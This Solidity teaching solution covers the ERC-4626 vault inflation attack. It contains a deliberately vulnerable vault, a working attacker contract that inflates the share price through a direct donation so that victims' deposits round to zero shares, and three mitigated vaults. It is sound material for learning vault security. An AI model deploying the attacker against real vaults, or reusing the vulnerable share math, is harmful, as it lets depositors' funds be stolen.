// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

/**
 * @title Project 44 Solution: ERC-4626 Inflation Attack Demo
 * @notice Complete implementation showing vulnerability and all mitigations
 */

// ======================
// VULNERABLE VAULT (SOLUTION)
// ======================

/**
 * @title VulnerableVault
 * @notice Basic ERC-4626 vault WITHOUT inflation attack protection
 * @dev EDUCATIONAL ONLY - DO NOT USE IN PRODUCTION
 */
contract VulnerableVault is ERC4626 {
    using Math for uint256;
    using SafeERC20 for IERC20;

    constructor(IERC20 asset)
        ERC4626(asset)
        ERC20("Vulnerable Vault", "vVAULT")
    {}

    /**
     * @notice Returns total assets held by the vault
     * @dev Includes deposited assets AND any direct transfers (donations)
     * @return Total balance of underlying asset
     */
    function totalAssets() public view override returns (uint256) {
        // KEY VULNERABILITY: This includes donated tokens!
        return IERC20(asset()).balanceOf(address(this));
    }

    /**
     * @notice Convert assets to shares using standard formula
     * @dev VULNERABLE: Can round to zero when totalAssets >> totalSupply
     * @param assets Amount of assets to convert
     * @param rounding Rounding direction (up or down)
     * @return shares Number of shares (may be 0 due to rounding!)
     */
    function _convertToShares(uint256 assets, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();

        // First deposit: 1:1 ratio
        if (supply == 0) {
            return assets;
        }

        // Subsequent deposits: shares = assets * totalSupply / totalAssets
        // VULNERABILITY: If totalAssets is much larger than totalSupply,
        // this can round down to zero!
        //
        // Example attack scenario:
        // - totalSupply = 1 (attacker has 1 share)
        // - totalAssets = 1,000,001 (1 wei deposited + 1M wei donated)
        // - Victim deposits 1,000,000 wei
        // - shares = 1,000,000 * 1 / 1,000,001 = 0.999999...
        // - Integer division rounds to 0 shares!
        // - Victim loses their deposit
        return assets.mulDiv(supply, totalAssets(), rounding);
    }

    /**
     * @notice Convert shares to assets
     * @param shares Number of shares to convert
     * @param rounding Rounding direction
     * @return assets Amount of assets
     */
    function _convertToAssets(uint256 shares, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256 assets)
    {
        uint256 supply = totalSupply();

        // No shares exist yet
        if (supply == 0) {
            return shares;
        }

        // assets = shares * totalAssets / totalSupply
        return shares.mulDiv(totalAssets(), supply, rounding);
    }

    /**
     * @notice Deposit assets and receive shares
     * @param assets Amount to deposit
     * @param receiver Address to receive shares
     * @return shares Amount of shares minted (may be 0!)
     */
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        require(assets > 0, "Cannot deposit 0");

        // Calculate shares - may round to zero!
        shares = previewDeposit(assets);

        // Transfer assets from sender to vault
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);

        // Mint shares to receiver (may mint 0 shares!)
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
    }

    /**
     * @notice Redeem shares for assets
     * @param shares Amount of shares to redeem
     * @param receiver Address to receive assets
     * @param owner Owner of the shares
     * @return assets Amount of assets returned
     */
    function redeem(uint256 shares, address receiver, address owner)
        public
        override
        returns (uint256 assets)
    {
        require(shares > 0, "Cannot redeem 0");

        // Check allowance if redeeming for someone else
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        // Calculate assets to return
        assets = previewRedeem(shares);
        require(assets > 0, "Cannot redeem for 0 assets");

        // Burn shares
        _burn(owner, shares);

        // Transfer assets to receiver
        IERC20(asset()).safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
}

// ======================
// ATTACKER CONTRACT (SOLUTION)
// ======================

/**
 * @title InflationAttacker
 * @notice Executes the inflation attack against vulnerable vaults
 * @dev This demonstrates the attack - DO NOT USE MALICIOUSLY
 */
contract InflationAttacker {
    using SafeERC20 for IERC20;

    VulnerableVault public immutable vault;
    IERC20 public immutable asset;

    // Track investment and returns
    uint256 public initialDeposit;
    uint256 public donationAmount;
    uint256 public finalWithdrawal;

    event AttackExecuted(uint256 initialDeposit, uint256 donation);
    event ProfitCollected(uint256 withdrawal, int256 profit);

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }

    /**
     * @notice Execute the inflation attack
     * @param _donationAmount Amount to donate after initial deposit
     *
     * ATTACK MECHANISM:
     * Step 1: Deposit 1 wei → get 1 share
     *         State: totalSupply=1, totalAssets=1, price=1 wei/share
     *
     * Step 2: Donate _donationAmount directly (bypass deposit function)
     *         State: totalSupply=1, totalAssets=1+donation, price=(1+donation)/share
     *
     * Step 3: Victim deposits amount < donationAmount
     *         Calculation: shares = victimAmount * 1 / (1 + donation)
     *         Result: rounds to 0 shares!
     *
     * Step 4: Victim's assets added to vault but they got 0 shares
     *         State: totalSupply=1 (still!), totalAssets=1+donation+victimAmount
     *
     * Step 5: Attacker redeems 1 share
     *         Gets: (1 * totalAssets) / 1 = all assets
     *         Profit: victimAmount - donationAmount - 1
     */
    function executeAttack(uint256 _donationAmount) external {
        // Step 1: Make minimal deposit to get 1 share
        initialDeposit = 1;

        // Approve vault to spend our tokens
        asset.safeApprove(address(vault), type(uint256).max);

        // Deposit 1 wei to receive 1 share
        // This makes us the sole shareholder
        vault.deposit(initialDeposit, address(this));

        // Verify we got 1 share
        require(vault.balanceOf(address(this)) == 1, "Should have 1 share");

        // Step 2: Donate large amount directly to vault
        // This bypasses the deposit function and inflates totalAssets
        // without minting new shares!
        donationAmount = _donationAmount;
        asset.safeTransfer(address(vault), donationAmount);

        // At this point:
        // - We own 1 share (100% of supply)
        // - totalAssets = 1 + donationAmount
        // - Share price = (1 + donationAmount) / 1 = massive!
        //
        // Any victim deposit < donationAmount will round to 0 shares

        emit AttackExecuted(initialDeposit, donationAmount);
    }

    /**
     * @notice Collect profit after victims have deposited
     * @return profit Amount gained (or lost if attack failed)
     *
     * PROFIT CALCULATION:
     * - We invested: initialDeposit (1 wei) + donationAmount
     * - We redeem: all shares → all totalAssets
     * - Profit: totalAssets - (initialDeposit + donationAmount)
     * - This equals the sum of all victim deposits that rounded to 0 shares!
     */
    function collectProfit() external returns (uint256 profit) {
        // Redeem all our shares
        uint256 shares = vault.balanceOf(address(this));
        require(shares > 0, "No shares to redeem");

        // This returns our proportional share of totalAssets
        // Since we own 100% of shares, we get 100% of assets!
        finalWithdrawal = vault.redeem(shares, address(this), address(this));

        // Calculate profit (may be negative if no victims deposited enough)
        int256 profitSigned = int256(finalWithdrawal) - int256(initialDeposit + donationAmount);

        emit ProfitCollected(finalWithdrawal, profitSigned);

        // Return profit (0 if negative)
        return profitSigned > 0 ? uint256(profitSigned) : 0;
    }

    /**
     * @notice Calculate expected profit from attack
     * @param victimDeposit Amount victim is expected to deposit
     * @return profit Expected profit (negative if attack would fail)
     *
     * ECONOMIC ANALYSIS:
     * Attack succeeds if victim gets 0 shares:
     * - victimDeposit * totalSupply / totalAssets < 1
     * - victimDeposit * 1 / (1 + donationAmount) < 1
     * - victimDeposit < 1 + donationAmount
     *
     * Profit calculation:
     * - If victim gets 0 shares: profit = victimDeposit - donationAmount - 1
     * - If victim gets ≥1 share: attack fails, lose donation
     *
     * For attack to be profitable:
     * - victimDeposit > donationAmount + 1
     */
    function calculateExpectedProfit(uint256 victimDeposit)
        external
        view
        returns (int256 profit)
    {
        // Total cost of attack
        uint256 totalCost = initialDeposit + donationAmount;

        // If victim gets 0 shares, we capture their full deposit
        // Expected total withdrawal: 1 + donationAmount + victimDeposit
        uint256 expectedWithdrawal = totalCost + victimDeposit;

        // Profit = withdrawal - cost
        profit = int256(expectedWithdrawal) - int256(totalCost);

        // In reality: profit = victimDeposit (our costs cancel out)
        return int256(victimDeposit) - int256(donationAmount);
    }

    /**
     * @notice Check if victim would get 0 shares
     * @param victimDeposit Amount victim would deposit
     * @return wouldGetZero True if victim would receive 0 shares
     */
    function victimWouldGetZeroShares(uint256 victimDeposit)
        external
        view
        returns (bool wouldGetZero)
    {
        // Simulate the share calculation
        uint256 supply = vault.totalSupply();
        uint256 assets = vault.totalAssets();

        if (supply == 0) {
            return false; // First depositor always gets shares
        }

        // Calculate shares using same formula as vault
        uint256 shares = (victimDeposit * supply) / assets;

        return shares == 0;
    }
}

// ======================
// MITIGATION 1: Virtual Shares (SOLUTION)
// ======================

/**
 * @title VaultWithVirtualShares
 * @notice Protected vault using virtual shares/assets offset
 * @dev Based on OpenZeppelin's ERC4626 protection mechanism
 *
 * MITIGATION EXPLANATION:
 * Virtual offset adds phantom shares and assets to calculations.
 * This makes the attack exponentially more expensive.
 *
 * Formula with offset=3 (1000 virtual shares):
 * shares = assets * (totalSupply + 1000) / (totalAssets + 1)
 *
 * ATTACK COST INCREASE:
 * Without offset:
 * - Attacker deposits 1 wei, donates 1M wei
 * - Victim deposits 999K wei → 0 shares ✗
 *
 * With offset=3:
 * - Attacker deposits 1 wei, donates 1M wei
 * - Victim deposits 999K wei
 * - shares = 999000 * (1 + 1000) / (1000001 + 1) = 999 shares ✓
 * - To make victim get 0 shares, attacker needs 1000x more capital!
 */
contract VaultWithVirtualShares is ERC4626 {
    using Math for uint256;
    using SafeERC20 for IERC20;

    uint8 private immutable _offset;

    constructor(IERC20 asset, uint8 offset_)
        ERC4626(asset)
        ERC20("Virtual Shares Vault", "vsVAULT")
    {
        _offset = offset_;
    }

    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this));
    }

    /**
     * @notice Returns decimals offset for virtual shares
     * @return Offset value (e.g., 3 means 10^3 = 1000 virtual shares)
     */
    function _decimalsOffset() internal view virtual returns (uint8) {
        return _offset;
    }

    /**
     * @notice Convert assets to shares with virtual offset
     * @dev Adds virtual shares and assets to prevent inflation attack
     *
     * PROTECTION MECHANISM:
     * Instead of: shares = assets * totalSupply / totalAssets
     * We use: shares = assets * (totalSupply + OFFSET) / (totalAssets + 1)
     *
     * The virtual offset makes it exponentially more expensive to manipulate
     * the share price enough to cause victim deposits to round to zero.
     *
     * @param assets Amount of assets
     * @param rounding Rounding direction
     * @return Number of shares
     */
    function _convertToShares(uint256 assets, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        // Calculate virtual offset: 10^_offset
        // offset=0: 1 virtual share (minimal protection)
        // offset=3: 1000 virtual shares (good protection)
        // offset=6: 1M virtual shares (very strong protection)
        uint256 virtualShares = 10 ** _decimalsOffset();

        // Add virtual shares to supply and 1 to assets
        // This prevents the ratio from being too extreme
        return assets.mulDiv(
            totalSupply() + virtualShares,
            totalAssets() + 1,
            rounding
        );
    }

    /**
     * @notice Convert shares to assets with virtual offset
     * @dev Uses same offset to maintain consistency
     */
    function _convertToAssets(uint256 shares, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        uint256 virtualShares = 10 ** _decimalsOffset();

        return shares.mulDiv(
            totalAssets() + 1,
            totalSupply() + virtualShares,
            rounding
        );
    }

    /**
     * @notice Standard deposit function
     * @dev Protected by virtual shares in conversion
     */
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        require(assets > 0, "Cannot deposit 0");

        shares = previewDeposit(assets);
        require(shares > 0, "Would receive 0 shares");

        IERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
    }

    /**
     * @notice Standard redeem function
     */
    function redeem(uint256 shares, address receiver, address owner)
        public
        override
        returns (uint256 assets)
    {
        require(shares > 0, "Cannot redeem 0");

        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        assets = previewRedeem(shares);
        require(assets > 0, "Would receive 0 assets");

        _burn(owner, shares);
        IERC20(asset()).safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
}

// ======================
// MITIGATION 2: Minimum Deposit (SOLUTION)
// ======================

/**
 * @title VaultWithMinDeposit
 * @notice Protected vault requiring minimum first deposit
 *
 * MITIGATION EXPLANATION:
 * Forces first depositor to commit substantial capital.
 * Makes attack economically unfeasible.
 *
 * ECONOMIC PROTECTION:
 * If MIN_FIRST_DEPOSIT = 1000 ether:
 * - Attacker must deposit 1000 ether initially
 * - To profit, must donate > victim's deposit
 * - If victim deposits 100 ether, attacker must donate > 100 ether
 * - Total cost: 1000 + 100 = 1100 ether
 * - Gain: 100 ether
 * - Net: -1000 ether (massive loss!)
 *
 * Attack only profitable if victim deposits > 1000 ether AND attacker donates less.
 * This is much harder to achieve.
 */
contract VaultWithMinDeposit is ERC4626 {
    using Math for uint256;
    using SafeERC20 for IERC20;

    uint256 public immutable MIN_FIRST_DEPOSIT;

    event FirstDeposit(address indexed depositor, uint256 amount);

    constructor(IERC20 asset, uint256 minFirstDeposit)
        ERC4626(asset)
        ERC20("Min Deposit Vault", "mdVAULT")
    {
        MIN_FIRST_DEPOSIT = minFirstDeposit;
    }

    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this));
    }

    function _convertToShares(uint256 assets, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        uint256 supply = totalSupply();
        return (supply == 0)
            ? assets
            : assets.mulDiv(supply, totalAssets(), rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        uint256 supply = totalSupply();
        return (supply == 0)
            ? shares
            : shares.mulDiv(totalAssets(), supply, rounding);
    }

    /**
     * @notice Deposit with minimum first deposit requirement
     * @dev First depositor must deposit at least MIN_FIRST_DEPOSIT
     *
     * PROTECTION MECHANISM:
     * By requiring a large first deposit, we force the attacker to commit
     * significant capital upfront. This makes the attack unprofitable unless
     * they can attract a victim who deposits even more.
     *
     * Example:
     * - MIN_FIRST_DEPOSIT = 1000 ether
     * - Attacker deposits 1000 ether (forced)
     * - Attacker would need to donate > victim deposit
     * - Even with donation, attack cost > victim deposit
     * - Attack is unprofitable!
     */
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        require(assets > 0, "Cannot deposit 0");

        // PROTECTION: Check minimum first deposit
        if (totalSupply() == 0) {
            require(
                assets >= MIN_FIRST_DEPOSIT,
                "First deposit must meet minimum"
            );
            emit FirstDeposit(msg.sender, assets);
        }

        shares = previewDeposit(assets);
        require(shares > 0, "Would receive 0 shares");

        IERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        public
        override
        returns (uint256 assets)
    {
        require(shares > 0, "Cannot redeem 0");

        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        assets = previewRedeem(shares);
        require(assets > 0, "Would receive 0 assets");

        _burn(owner, shares);
        IERC20(asset()).safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
}

// ======================
// MITIGATION 3: Dead Shares (SOLUTION)
// ======================

/**
 * @title VaultWithDeadShares
 * @notice Protected vault using dead shares pattern
 *
 * MITIGATION EXPLANATION:
 * First deposit mints shares to a dead address that can never be redeemed.
 * This permanently inflates totalSupply, preventing manipulation.
 *
 * PROTECTION MECHANISM:
 * With DEAD_SHARES = 1000:
 * - First depositor deposits 2000 assets
 * - Mint 1000 shares to dead address (0xdead)
 * - Mint 1000 shares to depositor
 * - totalSupply = 2000, totalAssets = 2000
 *
 * Attack attempt:
 * - Attacker is first depositor, deposits 2000
 * - Gets only 1000 shares (1000 burned to dead address)
 * - Attacker donates 1M assets
 * - totalSupply = 2000, totalAssets = 1,002,000
 * - Victim deposits 1000
 * - shares = 1000 * 2000 / 1,002,000 = 1.996... = 1 share ✓
 * - Victim got shares! Attack failed.
 *
 * The dead shares provide permanent protection that can't be bypassed.
 */
contract VaultWithDeadShares is ERC4626 {
    using Math for uint256;
    using SafeERC20 for IERC20;

    uint256 public constant DEAD_SHARES = 1000;
    address public constant DEAD_ADDRESS = address(0xdead);

    bool private _initialized;

    event DeadSharesMinted(uint256 amount);

    constructor(IERC20 asset)
        ERC4626(asset)
        ERC20("Dead Shares Vault", "dsVAULT")
    {}

    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this));
    }

    function _convertToShares(uint256 assets, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        uint256 supply = totalSupply();
        return (supply == 0)
            ? assets
            : assets.mulDiv(supply, totalAssets(), rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding)
        internal
        view
        override
        returns (uint256)
    {
        uint256 supply = totalSupply();
        return (supply == 0)
            ? shares
            : shares.mulDiv(totalAssets(), supply, rounding);
    }

    /**
     * @notice Deposit with dead shares initialization
     * @dev First deposit burns DEAD_SHARES to permanent dead address
     *
     * PROTECTION MECHANISM:
     * The dead shares are minted once and can never be redeemed.
     * This provides permanent inflation of totalSupply that the attacker
     * cannot control or bypass.
     *
     * Key properties:
     * 1. Dead shares are minted to uncontrolled address (0xdead)
     * 2. Dead shares count toward totalSupply
     * 3. Dead shares cannot be redeemed (no private key for 0xdead)
     * 4. Makes totalSupply always > 1, preventing price manipulation
     *
     * Trade-off:
     * First depositor "loses" DEAD_SHARES worth of assets.
     * This is the cost of the protection.
     */
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        require(assets > 0, "Cannot deposit 0");

        // PROTECTION: Handle first deposit specially
        if (!_initialized) {
            // First deposit must be larger than dead shares
            require(assets > DEAD_SHARES, "First deposit too small");

            // Mint dead shares to dead address
            // These shares are forever locked and count toward totalSupply
            _mint(DEAD_ADDRESS, DEAD_SHARES);

            // Depositor gets assets - DEAD_SHARES as shares
            // This is their "cost" for the permanent protection
            shares = assets - DEAD_SHARES;
            _mint(receiver, shares);

            // Mark as initialized
            _initialized = true;

            emit DeadSharesMinted(DEAD_SHARES);
        } else {
            // Normal deposits use standard calculation
            shares = previewDeposit(assets);
            require(shares > 0, "Would receive 0 shares");
            _mint(receiver, shares);
        }

        // Transfer assets from depositor
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);

        emit Deposit(msg.sender, receiver, assets, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        public
        override
        returns (uint256 assets)
    {
        require(shares > 0, "Cannot redeem 0");

        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        assets = previewRedeem(shares);
        require(assets > 0, "Would receive 0 assets");

        _burn(owner, shares);
        IERC20(asset()).safeTransfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }

    /**
     * @notice Check if vault has been initialized with dead shares
     */
    function isInitialized() external view returns (bool) {
        return _initialized;
    }

    /**
     * @notice Get dead shares balance
     * @dev Should always be DEAD_SHARES after initialization
     */
    function deadSharesBalance() external view returns (uint256) {
        return balanceOf(DEAD_ADDRESS);
    }
}

/**
 * @dev Complete Solution Summary:
 *
 * VULNERABILITY DEMONSTRATED:
 * - VulnerableVault: Shows how donation + small deposit = 0 shares for victim
 * - InflationAttacker: Executes the complete attack flow
 * - Economic analysis: Shows when attack is profitable
 *
 * MITIGATIONS IMPLEMENTED:
 *
 * 1. Virtual Shares (VaultWithVirtualShares):
 *    - Adds mathematical offset to calculations
 *    - Makes attack exponentially more expensive
 *    - Used by OpenZeppelin
 *    - Best for: General purpose, established pattern
 *
 * 2. Minimum Deposit (VaultWithMinDeposit):
 *    - Forces large first deposit
 *    - Economic deterrent
 *    - Simple to understand
 *    - Best for: Simple vaults, predictable asset values
 *
 * 3. Dead Shares (VaultWithDeadShares):
 *    - Permanently burns initial shares
 *    - Cannot be bypassed
 *    - Small cost to first depositor
 *    - Best for: Maximum security, public vaults
 *
 * CHOOSING A MITIGATION:
 * - High-value vaults: Use Virtual Shares (offset=3+) + maybe Dead Shares
 * - Simple vaults: Minimum Deposit may suffice
 * - Maximum security: Combine multiple strategies
 * - Follow standards: Use OpenZeppelin ERC4626 (includes Virtual Shares)
 *
 * TESTING RECOMMENDATIONS:
 * - Test attack on vulnerable implementation
 * - Verify each mitigation prevents attack
 * - Check economic boundaries
 * - Test first depositor experience
 * - Verify gas costs are acceptable
 * - Test edge cases (max values, dust amounts, etc.)
 */
